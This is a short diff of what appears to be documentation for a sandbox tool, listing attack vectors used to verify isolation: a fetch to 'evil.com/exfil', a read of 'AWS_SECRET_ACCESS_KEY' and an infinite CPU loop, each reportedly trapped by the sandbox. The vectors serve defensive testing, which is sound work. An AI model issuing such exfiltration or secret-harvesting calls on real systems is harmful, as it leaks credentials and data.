@@ -125,3 +125,4 @@ Using `slice microvm-bench --tenants=1000` and `slice verify-security`, we spawn
 3. **Vector 3 (Supply-Chain Network Exfiltration):** `fetch("https://evil.com/exfil")` inside a compartment scoped to `db.internal:5432` -> Deterministically trapped by `SandboxViolation::NetAccessDenied`.
 4. **Vector 4 (Ambient Secret Harvesting):** `env("AWS_SECRET_ACCESS_KEY")` inside a compartment without explicit env capability -> Deterministically trapped by `SandboxViolation::EnvAccessDenied`.
 5. **Vector 5 (CPU Denial-of-Service Loop):** `while (true) {}` inside a compartment with a fuel ceiling -> Deterministically preempted in `< 10 us` by `SandboxViolation::CpuFuelExhausted`.
+
